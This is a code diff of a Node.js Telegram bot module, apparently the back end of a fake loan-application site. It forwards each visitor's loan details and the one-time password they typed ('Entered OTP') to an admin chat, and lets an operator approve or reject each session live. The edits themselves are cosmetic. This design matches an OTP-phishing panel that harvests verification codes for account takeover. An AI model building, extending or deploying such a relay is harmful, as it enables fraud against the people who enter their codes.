@@ -5,10 +5,10 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const SERVER_URL = process.env.RENDER_EXTERNAL_URL;
 
-// Initialize bot with polling for Render production
+// Initialize bot with polling for Render
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// --- UTILITIES ---
+// --- HELPERS ---
 const escapeHTML = (str) => String(str || "N/A").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
 const currency = (n) => `TZS ${Number(n || 0).toLocaleString()}`;
 
@@ -19,8 +19,7 @@ const send = (msg, options = {}) => {
     }).catch(err => console.error("Telegram Send Error:", err.message));
 };
 
-// --- STEP SENDERS ---
-// Each function sends a fresh, dedicated message to Telegram
+// --- STEP-BY-STEP SENDERS ---
 
 const sendStep1 = (d) => {
     return send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);
@@ -35,7 +34,7 @@ const sendStep3 = (d) => {
 };
 
 const sendStep4 = (d) => {
-    // Only triggered once the user physically enters the code
+    // Only called when OTP is verified
     return send(`✅ <b>STEP 4 – OTP VERIFIED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n🔢 <b>Entered OTP:</b> <code>${escapeHTML(d.otp)}</code>`);
 };
 
@@ -50,13 +49,12 @@ const sendStep5 = (d) => {
     });
 };
 
-// --- CALLBACK HANDLER ---
+// --- CALLBACK ACTIONS ---
 bot.on("callback_query", async (query) => {
     const [action, socketId] = query.data.split("_");
     const message = query.message;
 
     try {
-        // Send the decision back to server.js via Render URL
         await axios.post(`${SERVER_URL}/admin/action`, { 
             socketId, 
             action: action === "apr" ? "approve" : "reject" 
@@ -64,22 +62,14 @@ bot.on("callback_query", async (query) => {
 
         const statusText = action === "apr" ? "✅ APPROVED" : "❌ REJECTED";
         
-        // Update the Telegram message to show the final decision
         bot.editMessageText(`${message.text}\n\n${statusText} BY ADMIN`, {
             chat_id: ADMIN_CHAT_ID,
             message_id: message.message_id,
             parse_mode: "HTML"
         });
     } catch (err) {
-        console.error("Callback Processing Error:", err.message);
-        bot.answerCallbackQuery(query.id, { text: "Error connecting to server." });
+        console.error("Callback Error:", err.message);
     }
 });
 
-module.exports = { 
-    sendStep1, 
-    sendStep2, 
-    sendStep3, 
-    sendStep4, 
-    sendStep5 
-};
+module.exports = { sendStep1, sendStep2, sendStep3, sendStep4, sendStep5 };
